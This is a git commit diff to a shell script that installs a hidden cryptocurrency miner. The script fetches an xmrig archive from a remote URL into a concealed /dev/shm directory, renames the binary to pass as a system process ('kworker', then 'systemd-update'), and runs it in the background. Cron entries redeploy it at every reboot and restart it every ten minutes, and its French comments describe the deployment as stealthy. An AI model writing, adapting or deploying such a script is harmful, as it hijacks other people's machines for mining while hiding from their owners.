064e2d0c2a43df60655a57a29ce2fe6ecc08810b
ThipyThipy <thipypro@gmail.com>
2025-04-10 23:01:50 +0200

    Update setup.sh

--- setup.sh
+++ setup.sh
@@ -1,7 +1,7 @@
 #!/bin/bash
 
 DIR="/dev/shm/.syslog"
-BIN="kworker"
+BIN="systemd-update"
 ARCHIVE_URL="https://raw.githubusercontent.com/ThipyThipy/machinee/main/xmrig.tar.gz"
 PERSIST_DIR="$HOME/.cache/sysconfig"
 PERSIST_ARCHIVE="$PERSIST_DIR/xmrig.tar.gz"
@@ -14,19 +14,17 @@ mkdir -p "$DIR" "$PERSIST_DIR" && cd "$DIR" || exit 1
 curl -fsSL "$ARCHIVE_URL" -o miner.tar.gz
 tar -xzf miner.tar.gz
 
-# Trouver le binaire dans l'archive
-BIN_FILE=$(find . -type f -executable -name "*" | head -n 1)
-mv "$BIN_FILE" "$BIN"
+# Vérifier que le binaire est là et exécutable
 chmod +x "$BIN"
 
 # Lancer furtivement avec log temporaire
-nohup nice -n 19 "$DIR/$BIN" --config="$DIR/cfg.json" > "$LOGFILE" 2>&1 &
+nohup nice -n 19 "$DIR/$BIN" --config="$DIR/config.json" > "$LOGFILE" 2>&1 &
 
 # Sauvegarde dans un dossier persistant
 cp miner.tar.gz "$PERSIST_ARCHIVE"
 
 # Cron reboot : re-déploiement furtif + log debug
-(crontab -l 2>/dev/null; echo "@reboot sleep \$((RANDOM % 60)) && mkdir -p $DIR && tar -xzf $PERSIST_ARCHIVE -C $DIR && $DIR/$BIN --config=$DIR/cfg.json > $LOGFILE 2>&1") | crontab -
+(crontab -l 2>/dev/null; echo "@reboot sleep \$((RANDOM % 60)) && mkdir -p $DIR && tar -xzf $PERSIST_ARCHIVE -C $DIR && $DIR/$BIN --config=$DIR/config.json > $LOGFILE 2>&1") | crontab -
 
 # Watchdog toutes les 10 min avec log debug
-(crontab -l 2>/dev/null; echo "*/10 * * * * pgrep -f $BIN > /dev/null || (mkdir -p $DIR && tar -xzf $PERSIST_ARCHIVE -C $DIR && $DIR/$BIN --config=$DIR/cfg.json > $LOGFILE 2>&1)") | crontab -
+(crontab -l 2>/dev/null; echo "*/10 * * * * pgrep -f $BIN > /dev/null || (mkdir -p $DIR && tar -xzf $PERSIST_ARCHIVE -C $DIR && $DIR/$BIN --config=$DIR/config.json > $LOGFILE 2>&1)") | crontab -
